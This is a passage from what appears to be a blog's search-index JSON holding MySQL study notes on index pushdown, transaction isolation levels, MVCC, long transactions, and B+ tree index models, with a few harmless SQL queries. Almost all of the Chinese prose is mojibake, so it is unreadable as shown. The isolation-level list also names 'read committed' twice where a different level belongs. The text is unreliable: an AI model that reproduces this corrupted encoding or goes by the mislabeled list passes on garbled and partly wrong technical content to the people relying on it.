¹æ®ä¸šåŠ¡éœ€æ±‚ï¼Œå°†æŸ¥æ‰¾é¢‘ç¹çš„æ•°æ®è¿›è¡Œé å·¦åˆ›å»ºç´¢å¼•ï¼Œæ¯”å¦‚name å­—æ®µæ˜¯æ¯” age å­—æ®µå¤§çš„ï¼Œé‚£ä¹ˆå»ºè®®åˆ›å»ºä¸€ä¸ªï¼ˆname,age) çš„è”åˆç´¢å¼•å’Œä¸€ä¸ª (age) çš„å•å­—æ®µç´¢å¼•ã€‚ ç´¢å¼•ä¸‹æ¨ï¼šname like â€˜å¼  %â€™ and age=10 è¿™æ¡ SQL è¯­å¥ï¼Œåœ¨ 5.6 ä¹‹å‰ï¼Œä¼šå¯¹åŒ¹é…çš„æ•°æ®ä¸€ä¸ªä¸ªå›è¡¨ï¼Œ5.6 ä¹‹åï¼Œä¼šå…ˆè¿‡æ»¤æ‰age&lt;10çš„æ•°æ®ï¼Œå†è¿›è¡Œå›è¡¨æŸ¥è¯¢ï¼Œå‡å°‘å›è¡¨æ¬¡æ•°ï¼Œæå‡æ£€ç´¢é€Ÿåº¦ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"03 äº‹åŠ¡éš”ç¦»ï¼šä¸ºä»€ä¹ˆä½ æ”¹äº†æˆ‘è¿˜çœ‹ä¸è§","slug":"transaction-lsolation-why-you-changed-I-can-not-see-it","date":"2022-06-01T14:55:59.000Z","updated":"2022-06-17T07:35:22.678Z","comments":true,"path":"transaction-lsolation-why-you-changed-I-can-not-see-it/","link":"","permalink":"https://www.0x2beace.com/transaction-lsolation-why-you-changed-I-can-not-see-it/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„éš”ç¦»æ€§ä¸éš”ç¦»çº§åˆ« äº†è§£é•¿äº‹åŠ¡å­˜å­˜åœ¨çš„é£é™© äº†è§£ Mysql äº‹åŠ¡éš”ç¦»çš„å®ç°åŠäº‹åŠ¡çš„å¯åŠ¨æ–¹å¼","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql çš„éš”ç¦»æ€§ä¸éš”ç¦»çº§åˆ« äº†è§£é•¿äº‹åŠ¡å­˜å­˜åœ¨çš„é£é™© äº†è§£ Mysql äº‹åŠ¡éš”ç¦»çš„å®ç°åŠäº‹åŠ¡çš„å¯åŠ¨æ–¹å¼ ç®€å•æ¥è¯´ï¼Œäº‹åŠ¡å°±æ˜¯è¦ä¿è¯ä¸€ç»„æ•°æ®åº“æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ã€‚åœ¨ MySQL ä¸­ï¼Œäº‹åŠ¡æ”¯æŒæ˜¯åœ¨å¼•æ“å±‚å®ç°çš„ã€‚ MyISAM è¢« InnoDB å–ä»£çš„é‡è¦åŸå› ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯å› ä¸º MySQL åŸç”Ÿçš„ MyISAM å¼•æ“å°±ä¸æ”¯æŒäº‹åŠ¡ã€‚ éš”ç¦»æ€§ä¸éš”ç¦»çº§åˆ«æåˆ°äº‹åŠ¡ï¼Œå°±ç¦»ä¸å¼€ ACID(Atomicityã€Consistencyã€Isolationã€Durabilityï¼Œå³åŸå­æ€§ã€ä¸€è‡´æ€§ã€éš”ç¦»æ€§ã€æŒä¹…æ€§)ï¼Œä»Šå¤©æ¥è¯´è¯´å…¶ä¸­ Iï¼Œä¹Ÿå°±æ˜¯â€œéš”ç¦»æ€§â€ã€‚ å½“æ•°æ®åº“ä¸Šæœ‰å¤šä¸ªäº‹åŠ¡åŒæ—¶æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±å¯èƒ½å‡ºç°ï¼š è„è¯»(dirty read)ï¼šä¸€ä¸ªäº‹åŠ¡æ­£åœ¨å¯¹ä¸€æ¡è®°å½•åšä¿®æ”¹ï¼Œåœ¨è¿™ä¸ªäº‹åŠ¡å®Œæˆå¹¶æäº¤å‰ï¼Œè¿™æ¡è®°å½•çš„æ•°æ®å°±å¤„äºä¸ä¸€è‡´çŠ¶æ€ï¼›è¿™æ—¶ï¼Œå¦ä¸€ä¸ªäº‹åŠ¡ä¹Ÿæ¥è¯»å–åŒä¸€æ¡è®°å½•ï¼Œå¦‚æœä¸åŠ æ§åˆ¶ï¼Œç¬¬äºŒä¸ªäº‹åŠ¡è¯»å–äº†è¿™äº›â€œè„â€æ•°æ®ï¼Œå¹¶æ®æ­¤åšè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œå°±ä¼šäº§ç”Ÿæœªæäº¤çš„æ•°æ®ä¾èµ–å…³ç³»ã€‚è¿™ç§ç°è±¡è¢«å½¢è±¡çš„å«ä½œâ€è„è¯»â€ã€‚ ä¸å¯é‡å¤è¯» (non-repeatable read)ï¼šä¸€ä¸ªäº‹åŠ¡åœ¨è¯»å–æŸäº›æ•°æ®åçš„æŸä¸ªæ—¶é—´ï¼Œå†æ¬¡è¯»å–ä»¥å‰è¯»è¿‡çš„æ•°æ®ï¼Œå´å‘ç°å…¶è¯»å‡ºçš„æ•°æ®å·²ç»å‘ç”Ÿäº†æ”¹å˜ã€æˆ–æŸäº›è®°å½•å·²ç»è¢«åˆ é™¤äº†ï¼è¿™ç§ç°è±¡å°±å«ä½œâ€œ ä¸å¯é‡å¤è¯»â€ã€‚ å¹»è¯»(phantom read)ï¼šä¸€ä¸ªäº‹åŠ¡æŒ‰ç›¸åŒçš„æŸ¥è¯¢æ¡ä»¶é‡æ–°è¯»å–ä»¥å‰æ£€ç´¢è¿‡çš„æ•°æ®ï¼Œå´å‘ç°å…¶ä»–äº‹åŠ¡æ’å…¥äº†æ»¡è¶³å…¶æŸ¥è¯¢æ¡ä»¶çš„æ–°æ•°æ®ï¼Œè¿™ç§ç°è±¡å°±ç§°ä¸ºâ€œå¹»è¯»â€ã€‚ ä¸ºäº†è§£å†³ä¸Šé¢è¿™äº›é—®é¢˜ï¼Œå°±æœ‰äº†â€œéš”ç¦»çº§åˆ«â€çš„æ¦‚å¿µï¼ŒSQL æ ‡å‡†çš„äº‹åŠ¡éš”ç¦»çº§åˆ«åŒ…æ‹¬ï¼š è¯»æœªæäº¤ï¼ˆread uncommittedï¼‰ï¼šä¸€ä¸ªäº‹åŠ¡è¿˜æ²¡æœ‰æäº¤æ—¶ï¼Œå®ƒåšçš„å˜æ›´å°±èƒ½è¢«åˆ«çš„äº‹åŠ¡æ‰€çœ‹åˆ° è¯»æäº¤ï¼ˆread committedï¼‰ï¼šä¸€ä¸ªäº‹åŠ¡æäº¤ä¹‹åï¼Œå®ƒåšçš„å˜æ›´æ‰ä¼šè¢«å…¶ä»–äº‹åŠ¡æ‰€çœ‹åˆ° è¯»æäº¤ï¼ˆread committedï¼‰ï¼šä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­çœ‹åˆ°çš„æ•°æ®ï¼Œæ€»æ˜¯è·Ÿè¿™ä¸ªäº‹åŠ¡åœ¨å¯åŠ¨æ—¶çœ‹åˆ°çš„æ•°æ®æ˜¯ä¸€è‡´çš„ ä¸²è¡ŒåŒ–ï¼ˆserializableï¼‰ï¼šå¯¹åŒä¸€è¡Œè®°å½•ï¼Œâ€œå†™â€ä¼šåŠ â€œå†™é”â€ï¼Œâ€œè¯»â€ä¼šåŠ â€œè¯»é”â€ã€‚å½“å‡º ç°è¯»å†™é”å†²çªçš„æ—¶å€™ï¼Œåè®¿é—®çš„äº‹åŠ¡å¿…é¡»ç­‰å‰ä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œå®Œæˆï¼Œæ‰èƒ½ç»§ç»­æ‰§è¡Œã€‚ è¿™å››ç§éš”ç¦»çº§åˆ«ä¸‹ï¼Œå¹¶è¡Œæ€§èƒ½ä¾æ¬¡é™ä½ï¼Œå®‰å…¨æ€§ä¾æ¬¡æé«˜ã€‚ æŸ¥çœ‹å½“å‰éš”ç¦»çº§åˆ«ï¼š 1mysql&gt; show variables like &#39;transaction_isolation&#39;; äº‹åŠ¡éš”ç¦»çš„å®ç°åœ¨ MySQL ä¸­ï¼Œå®é™…ä¸Šæ¯æ¡è®°å½•åœ¨æ›´æ–°çš„æ—¶å€™éƒ½ä¼šåŒæ—¶è®°å½•ä¸€æ¡å›æ»šæ“ä½œã€‚è®°å½•ä¸Šçš„æœ€æ–°å€¼ï¼Œé€šè¿‡å›æ»šæ“ä½œï¼Œéƒ½å¯ä»¥å¾—åˆ°å‰ä¸€ä¸ªçŠ¶æ€çš„å€¼ã€‚ å‡è®¾ä¸€ä¸ªå€¼ä» 1 è¢«æŒ‰é¡ºåºæ”¹æˆäº† 2ã€3ã€4ï¼Œåœ¨å›æ»šæ—¥å¿—é‡Œé¢å°±ä¼šæœ‰ç±»ä¼¼ä¸‹é¢çš„è®°å½•ã€‚ å½“å‰å€¼æ˜¯ 4ï¼Œä½†æ˜¯åœ¨æŸ¥è¯¢è¿™æ¡è®°å½•çš„æ—¶å€™ï¼Œä¸åŒæ—¶åˆ»å¯åŠ¨çš„äº‹åŠ¡ä¼šæœ‰ä¸åŒçš„ read-viewã€‚å¦‚ å›¾ä¸­çœ‹åˆ°çš„ï¼Œåœ¨è§†å›¾ Aã€Bã€C é‡Œé¢ï¼Œè¿™ä¸€ä¸ªè®°å½•çš„å€¼åˆ†åˆ«æ˜¯ 1ã€2ã€4ï¼ŒåŒä¸€æ¡è®°å½•åœ¨ç³»ç»Ÿ ä¸­å¯ä»¥å­˜åœ¨å¤šä¸ªç‰ˆæœ¬ï¼Œå°±æ˜¯æ•°æ®åº“çš„å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶(MVCC)ã€‚å¯¹äº read-view Aï¼Œè¦ å¾—åˆ° 1ï¼Œå°±å¿…é¡»å°†å½“å‰å€¼ä¾æ¬¡æ‰§è¡Œå›¾ä¸­æ‰€æœ‰çš„å›æ»šæ“ä½œå¾—åˆ°ã€‚ åŒæ—¶ä½ ä¼šå‘ç°ï¼Œå³ä½¿ç°åœ¨æœ‰å¦å¤–ä¸€ä¸ªäº‹åŠ¡æ­£åœ¨å°† 4 æ”¹æˆ 5ï¼Œè¿™ä¸ªäº‹åŠ¡è·Ÿ read-view Aã€Bã€ C å¯¹åº”çš„äº‹åŠ¡æ˜¯ä¸ä¼šå†²çªçš„ã€‚ ä¸ºä»€ä¹ˆä¸å»ºè®®ä½¿ç”¨é•¿äº‹åŠ¡ï¼Ÿ é•¿äº‹åŠ¡æ„å‘³ç€ç³»ç»Ÿé‡Œé¢ä¼šå­˜åœ¨å¾ˆè€çš„äº‹åŠ¡è§†å›¾ã€‚ç”±äºè¿™äº›äº‹åŠ¡éšæ—¶å¯èƒ½è®¿é—®æ•°æ®åº“é‡Œé¢çš„ä»»ä½•æ•°æ®ï¼Œæ‰€ä»¥è¿™ä¸ªäº‹åŠ¡æäº¤ä¹‹å‰ï¼Œæ•°æ®åº“é‡Œé¢å®ƒå¯èƒ½ç”¨åˆ°çš„å›æ»šè®°å½•éƒ½å¿…é¡»ä¿ç•™ï¼Œè¿™å°±ä¼šå¯¼è‡´å¤§é‡å ç”¨å­˜å‚¨ç©ºé—´ã€‚ é™¤äº†å¯¹å›æ»šæ®µçš„å½±å“ï¼Œé•¿äº‹åŠ¡è¿˜å ç”¨é”èµ„æºï¼Œä¹Ÿå¯èƒ½æ‹–å®æ•´ä¸ªåº“ã€‚ äº‹åŠ¡çš„å¯åŠ¨æ–¹å¼MySQL çš„äº‹åŠ¡å¯åŠ¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§: set autocommit=1ï¼Œæ˜¾å¼å¯åŠ¨äº‹åŠ¡è¯­å¥ï¼Œç”¨ begin æˆ– start transaction æ˜¾å¼å¯åŠ¨çš„äº‹åŠ¡ã€‚é…å¥—çš„æäº¤è¯­å¥æ˜¯ commitï¼Œå›æ»šè¯­ å¥æ˜¯ rollbackã€‚ set autocommit=0ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šå°†è¿™ä¸ªçº¿ç¨‹çš„è‡ªåŠ¨æäº¤å…³æ‰ã€‚æ„å‘³ç€å¦‚æœä½ åªæ‰§è¡Œä¸€ ä¸ª select è¯­å¥ï¼Œè¿™ä¸ªäº‹åŠ¡å°±å¯åŠ¨äº†ï¼Œè€Œä¸”å¹¶ä¸ä¼šè‡ªåŠ¨æäº¤ã€‚è¿™ä¸ªäº‹åŠ¡æŒç»­å­˜åœ¨ç›´åˆ°ä½ ä¸»åŠ¨æ‰§è¡Œ commit æˆ– rollback è¯­å¥ï¼Œæˆ–è€…æ–­å¼€è¿æ¥ã€‚ å»ºè®®æ€»æ˜¯ä½¿ç”¨ç¬¬ä¸€ç§ set autocommit=1, é€šè¿‡æ˜¾å¼è¯­å¥çš„æ–¹å¼æ¥å¯åŠ¨äº‹åŠ¡ï¼Œå› ä¸ºç¬¬äºŒç§æ–¹å¼åœ¨é•¿è¿æ¥çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„é•¿äº‹åŠ¡ã€‚ å›æ»šæ—¥å¿—æ˜¯ä¸å¯èƒ½ä¸€ç›´ä¿ç•™çš„ï¼Œå½“äº‹åŠ¡åœ¨ä¸éœ€è¦çš„æ—¶å€™ï¼Œå°±ä¼šè¢«åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç³»ç»Ÿä¼šåˆ¤æ–­ï¼Œå½“æ²¡æœ‰äº‹åŠ¡å†éœ€è¦ç”¨åˆ°è¿™äº›å›æ»šæ—¥å¿—æ—¶ï¼Œå›æ»šæ—¥å¿—å°±ä¼šè¢«åˆ é™¤ã€‚ ä»€ä¹ˆæ—¶å€™æ‰ä¸éœ€è¦äº†å‘¢ï¼Ÿ å°±æ˜¯å½“ç³»ç»Ÿé‡Œæ²¡æœ‰æ¯”è¿™ä¸ªå›æ»šæ—¥å¿—æ›´æ—©çš„ read-view çš„æ—¶å€™ã€‚ å¯ä»¥åœ¨ information_schema åº“çš„ innodb_trx è¿™ä¸ªè¡¨ä¸­æŸ¥è¯¢é•¿äº‹åŠ¡ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªè¯­å¥ï¼Œç”¨äºæŸ¥æ‰¾æŒç»­æ—¶é—´è¶…è¿‡ 60s çš„äº‹åŠ¡ã€‚ 1mysql&gt; select * from information_schema.innodb_trx where TIME_TO_SEC(timediff(now(),trx_started))&gt;60;","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"04 æ·±å…¥æµ…å‡ºç´¢å¼•ï¼ˆä¸Šï¼‰","slug":"introduction-to-the-index-part-1","date":"2022-06-01T14:53:46.000Z","updated":"2022-06-17T07:35:22.677Z","comments":true,"path":"introduction-to-the-index-part-1/","link":"","permalink":"https://www.0x2beace.com/introduction-to-the-index-part-1/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£æ•°æ®åº“å¼•æ“æ•°æ®ç»“æ„ äº†è§£ç´¢å¼•çš„å¸¸è§æ¨¡å‹ æŒ‡å¯¼ InnoDB ä¸ºä»€ä¹ˆè¦è¦é€‰æ‹© B+ æ ‘ä½œä¸ºç´¢å¼•æ¨¡å‹","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£æ•°æ®åº“å¼•æ“æ•°æ®ç»“æ„ äº†è§£ç´¢å¼•çš„å¸¸è§æ¨¡å‹ æŒ‡å¯¼ InnoDB ä¸ºä»€ä¹ˆè¦è¦é€‰æ‹© B+ æ ‘ä½œä¸ºç´¢å¼•æ¨¡å‹ ç´¢å¼•çš„å¸¸è§æ¨¡å‹ç´¢å¼•çš„å‡ºç°æ˜¯ä¸ºäº†æé«˜æŸ¥è¯¢æ•ˆç‡ï¼Œä½†æ˜¯å®ç°ç´¢å¼•çš„æ–¹å¼å´æœ‰å¾ˆå¤šç§ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿå°±å¼•å…¥äº†ç´¢å¼•æ¨¡å‹çš„æ¦‚å¿µã€‚ å¸¸è§çš„ä¸‰ç§ç´¢å¼•æ¨¡å‹ï¼š å“ˆå¸Œè¡¨ æœ‰åºæ•°ç»„ æœç´¢æ ‘ å“ˆå¸Œè¡¨å“ˆå¸Œè¡¨æ˜¯ä¸€ç§ä»¥é”® - å€¼(key-value)å­˜å‚¨æ•°æ®çš„ç»“æ„ï¼Œæˆ‘ä»¬åªè¦è¾“å…¥å¾…æŸ¥æ‰¾çš„å€¼å³ keyï¼Œ å°±å¯ä»¥æ‰¾åˆ°å…¶å¯¹åº”çš„å€¼å³ Valueã€‚ å“ˆå¸Œçš„æ€è·¯å¾ˆç®€å•ï¼ŒæŠŠå€¼æ”¾åœ¨æ•°ç»„é‡Œï¼Œç”¨ä¸€ä¸ªå“ˆå¸Œå‡½æ•°æŠŠ key æ¢ç®—æˆä¸€ä¸ªç¡®å®šçš„ä½ç½®ï¼Œç„¶åæŠŠ value æ”¾åœ¨æ•°ç»„çš„è¿™ä¸ªä½ç½®ã€‚ ä¸å¯é¿å…åœ°ï¼Œå¤šä¸ª key å€¼ç»è¿‡å“ˆå¸Œå‡½æ•°çš„æ¢ç®—ï¼Œä¼šå‡ºç°åŒä¸€ä¸ªå€¼çš„æƒ…å†µã€‚å¤„ç†è¿™ç§æƒ…å†µçš„ ä¸€ç§æ–¹æ³•æ˜¯ï¼Œæ‹‰å‡ºä¸€ä¸ªé“¾è¡¨ã€‚ ä¼˜ç‚¹ï¼šæ–°å¢é€Ÿåº¦å¾ˆå¿«ï¼Œåªéœ€è¦å¾€åé¢è¿½åŠ ã€‚ç¼ºç‚¹ï¼šå› ä¸ºä¸æ˜¯æœ‰åºçš„ï¼ŒåŒºé—´æŸ¥è¯¢é€Ÿåº¦å¾ˆæ…¢ã€‚ æ€»ç»“ï¼šå“ˆå¸Œè¡¨åªé€‚åˆç­‰å€¼æŸ¥è¯¢çš„åœºæ™¯ï¼Œæ¯”å¦‚ Memcached åŠå…¶ä»–ä¸€äº› NoSQL å¼•æ“ã€‚ æœ‰åºæ•°ç»„æœ‰åºæ•°ç»„åœ¨ç­‰å€¼æŸ¥è¯¢å’ŒèŒƒå›´æŸ¥è¯¢åœºæ™¯ä¸­çš„æ€§èƒ½å°±éƒ½éå¸¸ä¼˜ç§€ã€‚ å¦‚æœä»…ä»…çœ‹æŸ¥è¯¢æ•ˆç‡ï¼Œæœ‰åºæ•°ç»„å°±æ˜¯æœ€å¥½çš„æ•°æ®ç»“æ„äº†ã€‚ä½†æ˜¯ï¼Œåœ¨éœ€è¦æ›´æ–°æ•°æ®çš„æ—¶å€™å°±éº»çƒ¦äº†ï¼Œä½ å¾€ä¸­é—´æ’å…¥ä¸€ä¸ªè®°å½•å°±å¿…é¡»å¾—æŒªåŠ¨åé¢æ‰€æœ‰çš„è®°å½•ï¼Œæˆæœ¬å¤ªé«˜ã€‚ æ€»ç»“ï¼šæœ‰åºæ•°ç»„ç´¢å¼•åªé€‚ç”¨äºé™æ€å­˜å‚¨å¼•æ“ã€‚ äºŒå‰æœç´¢æ ‘äºŒå‰æ ‘æ˜¯æœç´¢æ•ˆç‡æœ€é«˜çš„ï¼Œä½†æ˜¯å®é™…ä¸Šå¤§å¤šæ•°çš„æ•°æ®åº“å­˜å‚¨å´å¹¶ä¸ä½¿ç”¨äºŒå‰æ ‘ã€‚å…¶åŸå› æ˜¯ï¼Œç´¢å¼•ä¸æ­¢å­˜åœ¨å†…å­˜ä¸­ï¼Œè¿˜è¦å†™åˆ°ç£ç›˜ä¸Šã€‚ æƒ³è±¡ä¸€ä¸‹ä¸€æ£µ 100 ä¸‡èŠ‚ç‚¹çš„å¹³è¡¡äºŒå‰æ ‘ï¼Œæ ‘é«˜ 20ã€‚ä¸€æ¬¡æŸ¥è¯¢å¯èƒ½éœ€è¦è®¿é—® 20 ä¸ªæ•° æ®å—ã€‚åœ¨æœºæ¢°ç¡¬ç›˜æ—¶ä»£ï¼Œä»ç£ç›˜éšæœºè¯»ä¸€ä¸ªæ•°æ®å—éœ€è¦ 10 ms å·¦å³çš„å¯»å€æ—¶é—´ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºä¸€ä¸ª 100 ä¸‡è¡Œçš„è¡¨ï¼Œå¦‚æœä½¿ç”¨äºŒå‰æ ‘æ¥å­˜å‚¨ï¼Œå•ç‹¬è®¿é—®ä¸€ä¸ªè¡Œå¯èƒ½éœ€è¦ 20 ä¸ª 10 ms çš„æ—¶é—´ã€‚ ä¸ºäº†è®©ä¸€ä¸ªæŸ¥è¯¢å°½é‡å°‘åœ°è¯»ç£ç›˜ï¼Œå°±å¿…é¡»è®©æŸ¥è¯¢è¿‡ç¨‹è®¿é—®å°½é‡å°‘çš„æ•°æ®å—ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ä¸ åº”è¯¥ä½¿ç”¨äºŒå‰æ ‘ï¼Œè€Œæ˜¯è¦ä½¿ç”¨â€œN å‰â€æ ‘ã€‚è¿™é‡Œï¼Œâ€œN å‰â€æ ‘ä¸­çš„â€œNâ€å–å†³äºæ•°æ®å—çš„å¤§å°ã€‚ InnoDB çš„ç´¢å¼•æ¨¡å‹åœ¨ InnoDB ä¸­ï¼Œè¡¨éƒ½æ˜¯æ ¹æ®ä¸»é”®é¡ºåºä»¥ç´¢å¼•çš„å½¢å¼å­˜æ”¾çš„ï¼Œè¿™ç§å­˜å‚¨æ–¹å¼çš„è¡¨ç§°ä¸ºç´¢å¼•ç»„ç»‡è¡¨ã€‚åˆå› ä¸ºå‰é¢æåˆ°çš„ï¼ŒInnoDB ä½¿ç”¨äº† B+ æ ‘ç´¢å¼•æ¨¡å‹ï¼Œæ‰€ä»¥æ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨ B+ æ ‘ä¸­çš„ã€‚ æ¯ä¸€ä¸ªç´¢å¼•åœ¨ InnoDB é‡Œé¢å¯¹åº”ä¸€æ£µ B+ æ ‘ã€‚ å‡è®¾ï¼Œæœ‰ä¸€ä¸ªä¸»é”®åˆ—ä¸º ID çš„è¡¨ï¼Œè¡¨ä¸­æœ‰å­—æ®µ kï¼Œå¹¶ä¸”åœ¨ k ä¸Šæœ‰ç´¢å¼•ã€‚ è¿™ä¸ªè¡¨çš„å»ºè¡¨è¯­å¥æ˜¯: 1234mysql&gt; create table T( id int primary key,k int not null,name varchar(16),index (k))engine&#x3D;InnoDB; è¡¨ä¸­ R1~R5 çš„ (ID,k) å€¼åˆ†åˆ«ä¸º (100,1)ã€(200,2)ã€(300,3)ã€(500,5) å’Œ (600,6)ï¼Œä¸¤æ£µæ ‘ çš„ç¤ºä¾‹ç¤ºæ„å›¾å¦‚ä¸‹ï¼š ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ ¹æ®å¶å­èŠ‚ç‚¹çš„å†…å®¹ï¼Œç´¢å¼•ç±»å‹åˆ†ä¸ºä¸»é”®ç´¢å¼•å’Œéä¸»é”®ç´¢å¼•ã€‚ ä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å­˜çš„æ˜¯æ•´è¡Œæ•°æ®ã€‚åœ¨ InnoDB é‡Œï¼Œä¸»é”®ç´¢å¼•ä¹Ÿè¢«ç§°ä¸ºèšç°‡ç´¢å¼• (clustered index)ã€‚ éä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å†…å®¹æ˜¯ä¸»é”®çš„å€¼ã€‚åœ¨ InnoDB é‡Œï¼Œéä¸»é”®ç´¢å¼•ä¹Ÿè¢«ç§°ä¸ºäºŒçº§ç´¢å¼• (secondary index)ã€‚ åŸºäºä¸»é”®ç´¢å¼•å’Œæ™®é€šç´¢å¼•çš„æŸ¥è¯¢æœ‰ä»€ä¹ˆåŒºåˆ«? å¦‚æœè¯­å¥æ˜¯ select * from T where ID=500ï¼Œå³ä¸»é”®æŸ¥è¯¢æ–¹å¼ï¼Œåˆ™åªéœ€è¦æœç´¢ ID è¿™æ£µ B+ æ ‘; å¦‚æœè¯­å¥æ˜¯ select * from T where k=5ï¼Œå³æ™®é€šç´¢å¼•æŸ¥è¯¢æ–¹å¼ï¼Œåˆ™éœ€è¦å…ˆæœç´¢ k ç´¢å¼• æ ‘ï¼Œå¾—åˆ° ID çš„å€¼ä¸º 500ï¼Œå†åˆ° ID ç´¢å¼•æ ‘æœç´¢ä¸€æ¬¡ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºå›è¡¨ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸºäºéä¸»é”®ç´¢å¼•çš„æŸ¥è¯¢éœ€è¦å¤šæ‰«æä¸€æ£µç´¢å¼•æ ‘ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨åº”ç”¨ä¸­åº”è¯¥å°½é‡ä½¿ç”¨ä¸»é”®æŸ¥è¯¢ã€‚ ç´¢å¼•ç»´æŠ¤B+ æ ‘ä¸ºäº†ç»´æŠ¤ç´¢å¼•æœ‰åºæ€§ï¼Œåœ¨æ’å…¥æ–°å€¼çš„æ—¶å€™éœ€è¦åšå¿…è¦çš„ç»´æŠ¤ã€‚ä»¥ä¸Šé¢è¿™ä¸ªå›¾ä¸ºä¾‹ï¼Œå¦‚ æœæ’å…¥æ–°çš„è¡Œ ID å€¼ä¸º 700ï¼Œåˆ™åªéœ€è¦åœ¨ R5 çš„è®°å½•åé¢æ’å…¥ä¸€ä¸ªæ–°è®°å½•ã€‚å¦‚æœæ–°æ’å…¥çš„ ID å€¼ä¸º 400ï¼Œå°±ç›¸å¯¹éº»çƒ¦äº†ï¼Œéœ€è¦é€»è¾‘ä¸ŠæŒªåŠ¨åé¢çš„æ•°æ®ï¼Œç©ºå‡ºä½ç½®ã€‚ è€Œæ›´ç³Ÿçš„æƒ…å†µæ˜¯ï¼Œå¦‚æœ R5 æ‰€åœ¨çš„æ•°æ®é¡µå·²ç»æ»¡äº†ï¼Œæ ¹æ® B+ æ ‘çš„ç®—æ³•ï¼Œè¿™æ—¶å€™éœ€è¦ç”³è¯·ä¸€ ä¸ªæ–°çš„æ•°æ®é¡µï¼Œç„¶åæŒªåŠ¨éƒ¨åˆ†æ•°æ®è¿‡å»ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºé¡µåˆ†è£‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ€§èƒ½è‡ªç„¶ä¼š å—å½±å“ã€‚ é™¤äº†æ€§èƒ½å¤–ï¼Œé¡µåˆ†è£‚æ“ä½œè¿˜å½±å“æ•°æ®é¡µçš„åˆ©ç”¨ç‡ã€‚åŸæœ¬æ”¾åœ¨ä¸€ä¸ªé¡µçš„æ•°æ®ï¼Œç°åœ¨åˆ†åˆ°ä¸¤ä¸ªé¡µ ä¸­ï¼Œæ•´ä½“ç©ºé—´åˆ©ç”¨ç‡é™ä½å¤§çº¦ 50%ã€‚ å½“ç„¶æœ‰åˆ†è£‚å°±æœ‰åˆå¹¶ã€‚å½“ç›¸é‚»ä¸¤ä¸ªé¡µç”±äºåˆ é™¤äº†æ•°æ®ï¼Œåˆ©ç”¨ç‡å¾ˆä½ä¹‹åï¼Œä¼šå°†æ•°æ®é¡µåšåˆå¹¶ã€‚åˆå¹¶çš„è¿‡ç¨‹ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯åˆ†è£‚è¿‡ç¨‹çš„é€†è¿‡ç¨‹ã€‚ 